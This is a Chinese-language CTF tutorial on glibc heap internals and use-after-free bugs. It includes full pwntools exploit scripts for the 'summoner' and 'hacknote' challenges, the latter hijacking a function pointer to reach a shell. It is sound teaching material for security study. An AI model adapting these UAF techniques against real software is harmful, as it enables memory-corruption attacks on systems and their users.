0x0前言
=====

从前面几期我们能够学习到一些CTF-pwn中关于栈溢出、格式化字符串漏洞题型的攻击技巧以及linux安全保护机制的原理以及绕过方法等等，这期我们正式进入堆入门的学习。

学习本节需要读者具有一定操作系统、C 语言及其运行机制的知识，而且为了对新手友好，简化了很多内容，语言可能没那么严谨，如有错误还请师傅们斧正。

0x1什么是堆？
========

堆是程序虚拟内存中由低地址向高地址增长的线性区域。一般只有当用户使用 **allocte族函数（malloc、alloc、realloc 函数）**向操作系统申请内存时，这片区域才会被内核分配出来，并且出于效率和页对齐的考虑，通常会分配相当大的连序内存。程序再次申请时便会从这片内存中分配，直到堆空间不能满足时才会再次增长。

![stack-memory](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-378a0498672f7635722b5edc9224deab2395adc9.jpg)

如图，堆不同于栈，栈是由高地址向低地址增长的，而堆是由低地址向高地址增长的。

CTF比赛中常见的堆是 **ptmalloc2堆管理器中的堆** ，它是由 **glibc** 实现的，它的管理机制是：

当用户申请堆块（内存）时，从堆中按顺序分配堆块交给用户，用户保存指向这些堆块的指针；当用户释放堆块时，glibc会将释放的堆块组织成链表；当两块相邻堆块都为释放状态时将之合并为一个新的堆块；由此解决内存碎片的问题。

有几个重要的概念：glibc中把用户正在使用的堆块称为 **allocated chunk** 。被释放的堆块称为 **free chunk** ，由 free chunk 组成的链表叫做 **bin**（垃圾桶）。为了方便管理，glibc将不同大小范围的 chunk 组织成不同的 bin。如 **fast bin** 、**small bin** 、**large bin** 以及 **unsorted bin** 。

0x3堆的实现
=======

首先我们要了解内存管理机制中的一个重要的概念—— **arena** （竞技场）

什么是Arena
--------

arena一个是用于管理线程中堆的结构

它具有以下特性：

一个线程只有一个arnea，并且这些线程的arnea都是独立的不是相同的。

主线程的arnea称为“**main\_arena**”。子线程的arnea称为“**thread\_arena**”。

主线程的堆大小不够分配的话可以调用 **brk函数** 来扩展，而子线程只能使用 **mmap函数** 来分配新内存

堆的结构体
-----

堆的glibc实现主要包括 **struct \_heap\_info，struct malloc\_state，struct malloc\_chunk** 这3个结构体。

### struct malloc\_state（Arena的实现）

glibc的中arnea就是用下面这个结构体表示的。其中包含很多的信息：各种bin的信息，**top chunk** 以及**last\_remainder chunk** 等。

```c
struct malloc_state
{
  /* Serialize access.  */
  __libc_lock_define (, mutex);

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Set if the fastbin chunks contain recently inserted free blocks.  */
  /* Note this is a bool but not all targets support atomics on booleans.  */
  int have_fastchunks;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;

  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;

  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */
  INTERNAL_SIZE_T attached_threads;

  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
}; 
```

### struct \_heap\_info

我们知道一个线程可以包含多个堆段，这些堆段同属于 **arena** 来管理。每个堆段的信息就是用下面这个结构体来表示的。

```c
typedef struct _heap_info
{
  mstate ar_ptr;            /* Arena for this heap. */
  struct _heap_info *prev;  /* Previous heap. */
  size_t size;              /* Current size in bytes. */
  size_t mprotect_size;     /* Size in bytes that has been mprotected
                             PROT_READ|PROT_WRITE.  */
  /* Make sure the following data is properly aligned, particularly
     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of
     MALLOC_ALIGNMENT. */
  char pad[-6 * SIZE_SZ & MALLOC_ALIGN_MASK];
} heap_info;
```

### struct malloc\_chunk

一个堆块被分为多个块，这些块就是用下面这个结构体表示的，这个才是我们在glibc的真正存储堆数据信息的结构体。

```c
struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).*/
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead.*/

  struct malloc_chunk* fd;   /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;

};
```

#### 字段详解：

**prev\_size** ： 如果上一个chunk处于释放状态，用于表示其大小；否则作为上一个chunk的一部分，用于保存上一个chunk的数据。

**size** ：表示当前chunk的大小，32位系统下必须是8字节的倍数，64位下必须是16字节的倍数。由于内存对齐的原因，最后三位用作状态标识符，从高位到低位分别代表：

```php
1.NON_MAIN_ARENA     这个堆块是否位于主线程
2.IS_MAPPED          记录当前 chunk 是否是由 mmap 分配的
3.PREV_INUSE         记录前一个 chunk 块是否被分配
```

**fd和bk指针** ：仅在当前chunk处于释放状态时有效。chunk在被释放后会加入到相对应的bin中，此时fd和bk指针会指向该bin（链表）中该chunk的上一个和下一个 free chunk ；如果当前chunk正在使用中，那么这两个字段是无效的，都用于存放该chunk中的用户数据。

**fd\_nextsize和bk\_nextsize指针** ：与fd和bk指针相似，都是只有当前chunk处于释放状态时才被启用，其他时候作为用户存储数据的空间。不同的是这两个字段仅用于 **large bin**，分别指向前后第一个和当前chunk大小不同的chunk。

下面是从网上找来的chunk结构体：

首先是 **allocated chunk** 结构图：

![chunk](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-54c1bba7b76f3e467298f525f34030223f90b694.png)

可以看到 **fd和bk** 以及 **fd\_nextsize和bk\_nextsize** 指针的空间都被用于存放用户数据，而且下一个chunk的 **prev\_size** 字段的空间也被用于当前chunk储存用户信息。

**free chunk** 结构图：

![freechunk](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-ab92607e0693bbfae1c66377fe0db08b1dfd6cb2.png)

可以看到 **fd和bk** 指针被启用，如果该chunk处于 **large bin** 中，**fd\_nextsize和bk\_nextsize** 指针也会被启用，并且下一个chunk的 **prev\_size** 字段是被用于表示它前一个chunk（当前chunk）的大小信息，而不是用户数据。

### malloc和free函数

```c
void *malloc(size_t n);
```

该函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理。  
当n=0时，返回当前系统允许的堆的最小内存块。  
当n为负数时，由于在大多数系统中，size\_t是无符号数，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。

```c
void free(void *p);
```

该函数会释放由p所指向的内存块。这个内存块有可能是通过malloc函数得到的，也有可能是通过相关的函数realloc得到的。该函数还对异常情况进行了一下处理：  
当p为空指针时，函数不执行任何操作。  
当p已经被释放之后，再次释放会出现错误的效果，这其实就是double free。  
除了被禁用（mallocpt）的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便减小程序所使用的内存空间。

### chunk的管理：

chunk是glibc管理内存的基本单位，整个堆在初始化后就会被当成一个**free chunk** ，称为 **top chunk** ， 每当用户申请内存时，如果 **bins** 中没有合适的chunk，**malloc** 就会切割 **top chunk**来分配，如果 **top chunk** 的大小不够时，就会调用 **brk函数** 扩展堆的大小，然后从新生成的 **top chunk** 里切割出一块内存分配给用户。 用户释放内存时， glibc 会先根据情况将释放chunk与其他相邻的 **free chunk** 进行合并，然后加入到合适的 **bin** 中。

0x4first fit机制与UAF漏洞
====================

first fit机制
-----------

**first fit机制** 是glibc的一种malloc原则，它使用了 first-fit 算法来选择空闲的 chunk。如果分配时存在一个大小满足要求（大于或等于需要的）的空闲 chunk 的话，glibc 就会选择这个 chunk，不再继续查找其他空闲的chunk。简单的说就是找到第一个符合条件的就返回。

UAF漏洞
-----

**UAF** 全称 **Use After Free** 就是其字面所表达的意思，当一个堆块被释放（free）之后再次被使用。但是其实这里有以下几种情况：

1.堆块被释放后，其对应的指针被设置为 **NULL** ， 然后再次使用，自然程序会崩溃。  
2.堆块被释放后，其对应的指针没有被设置为 **NULL** ，然后在它下一次被使用之前，没有代码对这块内存块进行 修改，那么程序很有可能可以正常运转。  
3.堆被释放后，其对应的指针没有被设置为 **NULL**，但是在它下一次使用之前，有代码对这块内存进行了修改，那 么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。  
而我们一般所指的 **Use After Free漏洞** 主要是后两种。此外，我们一般称被释放后没有被设置为 **NULL** 的内存指针为 **dangling pointer（悬挂指针）**。

程序演示：
-----

我们使用某国外大佬写的一个程序来演示一下 **first\_fit机制** 以及 **UAF漏洞**，下面是它的源代码 first\_fit.c:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    fprintf(stderr, "This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n");
    fprintf(stderr, "glibc uses a first-fit algorithm to select a free chunk.\n");
    fprintf(stderr, "If a chunk is free and large enough, malloc will select this chunk.\n");
    fprintf(stderr, "This can be exploited in a use-after-free situation.\n");

    fprintf(stderr, "Allocating 2 buffers. They can be large, don't have to be fastbin.\n");
    char* a = malloc(0x512);
    char* b = malloc(0x256);
    char* c;

    fprintf(stderr, "1st malloc(0x512): %p\n", a);
    fprintf(stderr, "2nd malloc(0x256): %p\n", b);
    fprintf(stderr, "we could continue mallocing here...\n");
    fprintf(stderr, "now let's put a string at a that we can read later \"this is A!\"\n");
    strcpy(a, "this is A!");
    fprintf(stderr, "first allocation %p points to %s\n", a, a);

    fprintf(stderr, "Freeing the first one...\n");
    free(a);

    fprintf(stderr, "We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n", a);

    fprintf(stderr, "So, let's allocate 0x500 bytes\n");
    c = malloc(0x500);
    fprintf(stderr, "3rd malloc(0x500): %p\n", c);
    fprintf(stderr, "And put a different string here, \"this is C!\"\n");
    strcpy(c, "this is C!");
    fprintf(stderr, "3rd allocation %p points to %s\n", c, c);
    fprintf(stderr, "first allocation %p points to %s\n", a, a);
    fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.\n");
}
```

编译并运行：

![image-20220205190349022](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3bebd77958f919fb2a1b570a38c80e6d9cb7afbe.png)

### 分析：

- 首先我们申请了两块堆内存：0x512（0x6b5010）, 0x256（0x6b5530）, 可以看到地址是不一样的，这里申请 0x256 大小的堆块的意义在于防止我们第一次申请的 0x512 大小的堆块 `free` 后与 top chunk 合并
- 然后我们向 0x512 这块内存填数据
- 然后我们释放掉这块内存，但是指向这块内存的指针 A 不置 `NULL`
- 接着我们申请一块 0x500 大小的堆块，可以看到这个堆块的地址跟我们第一次申请的 0x512 大小堆块的地址是一样的！然后我们先假设指向这块内存的指针叫做 C
- 然后填充这块数据为 `this is C!`
- 然后分别将指针 A 和指针 C 指向的内存的内容打印出来，可以看到都是 `this is C!`
- 而这就是 **fist fit** , 同时释放内存后不把指针置零也是 **UAF** 漏洞产生的原因

实战演练：
-----

### 题目1 - summoner

运行程序，可以看到这是一道菜单题：

![image-20220205194524267](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-46c540daba8137a78c800e211f249f0c785640e9.png)

从题目的描述可以知道程序的逻辑是我们可以召唤出最高等级为四的使徒，但是我们需要等级为5的使徒才能打败魔龙。

为了方便查看我定义了一个结构体：

![image-20220205200831179](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e174e31442ac1fe7b0a082b84210885edc6f21e9.png)

结构体成员 smm，

![image-20220205200907038](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-29103f438a3d7044aebf4146c5040d1fda8e63c8.png)

summon部分代码：

![image-20220205201042179](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-4feb6d26be97316773a76611946fb5261d44eceb.png)

我们注意到这里使用strdup函数，它将为smm申请一个与输入召唤物name字符串长度相同的chunk

```c
定义函数：char * strdup(const char *s);

函数说明：strdup()会先用maolloc()配置与参数s 字符串相同的空间大小，然后将参数s 字符串的内容复制到该内存地址，然后把该地址返回。该地址最后可以利用free()来释放。

返回值：返回一字符串指针，该指针指向复制后的新字符串地址。若返回NULL 表示内存不足。
```

strike部分代码：

![image-20220205201850248](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a36cdd3708bab02752cd867a8ecf58f0bf6cc758.png)

我们可以看到如果召唤物等级为5，就能get flag。

![image-20220205202007046](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5c7220a9721df9c6f989eef2e331ac3a1cb6f6de.png)

这里注意到程序仅仅只释放了 `name` 的内容，并没有释放整个结构体，这也是程序的漏洞所在。

让我们用gdb调试一下： ***gdb安装pwngdb插件，可以使用 praseheap指令来更方便地调试堆***

先创建一个召唤物 aaaa，输入 `summon aaaa`：

![image-20220205202745486](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-77f5938697bede003accb5c93a1cbafcd5832d70.png)

查看此时的堆，发现除了top chunk外，还有两个chunk：

![image-20220205202702256](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-055f4efb65fc253b629dafe0a613d247886f01cb.png)

查看第一个chunk的内容，发现第一个chunk储存着第二个chunk的指针，并且第二个chunk储存着召唤物的名称aaaaa：

![image-20220205202912595](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-b8fd85e37585f22dee46579941d61c1a5e1926c1.png)

输入`level-up 4`后，查看chunk内容：

![image-20220205203233136](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-81013f398d5eea9c0d25605849a3d70b5939dc79.png)

发现第一个chunk第一位储存着name的指针（指向保存name的chunk），第二位储存着召唤物的level。

我们释放掉这个chunk试试，输入`release`：

![image-20220205204329289](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-4ef0bb961fba89198fe0711b5ed93ed3e4059c1a.png)

我们发现仅仅第二个chunk被释放掉，但是第一个chunk却没有被释放掉（指向name的指针和等级依旧存在）,这是由于**程序仅仅free掉了name指针所指向的空间，而不是free掉整个结构体**，那么当再次申请的时候，由于**first fit 机制** 就会申请到释放后 第二个chunk的地址。

具体利用的话，我们可以用写name为 `a * 8 + '\x05'`, 此时chunk里的内容如下:

![image-20220205205102518](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5966a5189cae3107bea041fdbcefc089ecbedc73.png)

然后在`release`，

![image-20220205205333460](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3e7d9c9f4389417aa24d893d1b3f8a0aa6078ea0.png)

然后再一次 `summoner aaaa`，

![image-20220205205540991](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-926a1f5bf8ab27b7eaa5e8286ea349f6c1480c20.png)

我们发现结构体的空间申请到了name的位置，这里有我们精心构造的数据（第二为为0x5），这样我们就成功召唤出了一个等级为五的召唤物，即可以get flag了。

![image-20220205205819662](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-34a4d9baf72fa5f026478216a940e2f1122a6510.png)

**完整EXP：**

```python
from pwn import *
context.log_level = 'debug'
p = process("./summoner")

def sla(signal, content):
    p.sendlineafter(signal, content)

sla('>','summon ' + 'a'*8 + '\x05')
sla('>','release')
sla('>','summon aaaa')
sla('>','show')
sla('>','strike')

p.interactive()
```

### 题目2 - hacknote

运行程序，同样是一道菜单题（堆题最常见的考察形式）：

![image-20220205210324193](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f8704d0dc6935a1c3a6b9b5aeb428d89d6897cd1.png)

#### 静态分析

该题提供了四个功能，ida分析可知：

- 添加 note
    
    ```php
    add note
    ```
    
    ![image-20220206102005226](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f5b26d2a678951368909b87c4cefd953c8377e80.png)
    
    
    - 最多允许添加 5 个 note
    - 每个 note 有 `puts` 和 `content` 两个字段
    - puts 会被设置成一个函数 `print_note_content`, 即打印 `content` 内容
- 删除 note
    
    ```php
    delete note
    ```
    
    ![image-20220206102045535](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-96e144d0dcfef71ff3f8cae9baaf9b46b3169076.png)
    
    
    - 根据给定的索引来释放对应的 note
- 打印 note
    
    ```php
    print note
    ```
    
    ![image-20220206102102337](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d77ec9d58f1510ead1a89083d8cb38acca70757f.png)
    
    
    - 根据给定的 note 的索引来输出对应索引的 note 的内容
- 退出
    
    ```php
    exit
    ```
    
    
    - 退出程序

这里画了一个草图来说明：就是在一个数组notelist里每一格存放一个note结构体，结构体的第一位存放的是`print_note_content`函数，第二位存放着一个指向 `content` 的指针。

![image-20220206103819390](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3c6923e2f74a183efee074b92b55025ef624b104.png)

##### 漏洞利用

结合四个功能分析后可以知道漏洞点在

在 **print\_note** 函数中

```c
result = (_DWORD *)((int (__cdecl *)(_DWORD *))*notelist[v2])(notelist[v2]);
```

以自身为参数调用函数，而这个函数在 `add_note` 函数中被定义:

```c
*notelist[i] = print_note_content
```

因此就是打印 `note` 中的内容

在 **del\_note** 函数中

```c
free((void *)notelist[v2][1]);free(notelist[v2]);
```

**free 以后没有把指针置零**，这里肯定存在 **UAF** 了

并且程序中存在有后门函数——**magic**：

![image-20220206102504565](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d7d32759959d0f473131a355eb7137c391ab2e8c.png)

那么我们的攻击思路就可以是**通过 UAF 漏洞修改 note 的 puts 字段位 magic 函数的地址，从而在执行 print\_note 的时候执行 magic 函数**

具体思路如下:

- 先申请 note0, content size 为 16（0x10），内容为 'a'
- 再申请 note1, content size 为 16（0x10），内容为 'a'

此时的堆：

![image-20220206110237446](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5393bdf7e4792a7bfc3c43f617acde132fea70ce.png)

可以看到 **0x080485fb** 位置处是 `print_note_content`函数 ，我们的目的就是修改这个值为后门函数的地址。

- 然后先 free note0
- 再 free note1

此时，在 `fsatbins` 中链表为 `note1 -> note0`

![image-20220206110449863](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c1200b8b47bbc798f1d301bd83789eca20465eed.png)

- 申请 note2, content size 为 8, **内容为 magic的地址**
    
    查看此时的堆：
    
    ![image-20220206111125387](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9be761b03758126745e8ba6a58f1e601edd9ef29.png)

![image-20220206111630130](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-35c0a2c03334d9f4bbbc2ddf25b5132b2ab31fd3.png)

可以发现**note1结构体的chunk被分配给note2作为存放结构体的chunk，原来的note0结构体的位置被分配给note2作为 `content` 的chunk**，我们写入的内容覆盖note0结构体的 `print_note_content`函数地址为 后面函数 **magic** 的地址了。

- 这时候输入 `print_note(0)` 命令，调用note0结构体的第一位地址处的函数，我们就能成功getshell了

![image-20220206112940649](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e7d43d357374d42a991163779716ea6f7120829b.png)

这里 **print\_note(0) 函数** 能成功找到note0结构体的位置，是因为 **del\_note 函数** 没有把 note0 的指针置为 NULL, 这导致我们可以再次使用note0，这就是典型的 **UAF**。

##### Exp :

```python
from pwn import *
context.log_level = 'debug'

p = process('./hacknote')
#r = remote(, )
e = ELF('./hacknote')

def sla(signal, content):
  p.sendlineafter(signal, content)

def add_note(size, content):
    sla('Your choice :', '1')
    sla('Note size :', str(size))
    sla('Content :', content)

def del_note(index):
    sla('Your choice :', '2')
    sla('Index :', str(index))

def show(index):
    sla('Your choice :', '3')
    sla('Index :', str(index))

magic = p32(e.sym['magic']) #0x8048945

add_note(0x10, 'a') #0
add_note(0x10, 'a') #1
pause()
del_note(0) #0
del_note(1) #1
pause()
add_note(0x8, magic) #2
pause()
show(0)

p.interactive()
```

0x4总结
=====

因为堆涉及到了许多计算机底层的知识，主要是内存管理的知识，知识量比较庞大，也比较复杂，所以本篇仅仅对堆进行一些基础概念讲解并对first fit机制与UAF漏洞进行说明与演示，同时也参考了很多大牛的博客。演示中的例题在网上都是可以找到的，也可以私信我来获取。希望大家能自己动手操作，多多思考、多多调试。毕竟pwn的魅力就在于在反复的调试中一步一步逼近答案。

0x5参考文章
=======

[CTF-Wiki](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-overview/)

[30张图带你领略glibc内存管理精髓](https://www.modb.pro/db/152449)

[如何理解Glibc堆管理器](https://tokameine.top/2021/08/07/glibc-1/)